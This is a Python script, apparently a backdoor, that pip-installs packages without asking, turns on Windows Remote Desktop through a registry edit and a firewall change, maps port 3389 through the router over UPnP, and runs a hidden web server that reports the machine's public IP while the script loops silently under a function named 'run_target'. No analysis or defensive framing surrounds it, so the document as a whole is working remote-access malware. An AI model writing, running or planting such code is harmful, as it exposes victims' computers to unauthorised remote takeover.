import os
import subprocess
import socket
import threading
import sys

# Automatically install dependencies
def install_packages():
    import importlib
    for package in ["miniupnpc", "requests"]:
        try:
            importlib.import_module(package)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

install_packages()

import miniupnpc
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 5000  # hidden webserver port

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return None

def enable_rdp():
    subprocess.run(
        ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
         "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    subprocess.run(
        ["netsh", "advfirewall", "set", "rulegroup", "remote desktop", "new", "enable=Yes"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def forward_port(local_ip, port=3389):
    try:
        upnp = miniupnpc.UPnP()
        upnp.discoverdelay = 200
        upnp.discover()
        upnp.selectigd()
        upnp.addportmapping(port, 'TCP', local_ip, port, 'Remote Desktop', '')
        return True
    except:
        return False

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        local_ip = get_local_ip()
        public_ip = get_public_ip()
        ip_to_use = public_ip if public_ip else local_ip

        html = f"<html><body><p>{ip_to_use}</p></body></html>"
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

def start_webserver():
    server = HTTPServer(("0.0.0.0", PORT), RequestHandler)
    server.serve_forever()

def run_target():
    enable_rdp()
    local_ip = get_local_ip()
    forward_port(local_ip, 3389)
    threading.Thread(target=start_webserver, daemon=True).start()
    while True:
        pass  # keep running silently

if __name__ == "__main__":
    run_target()
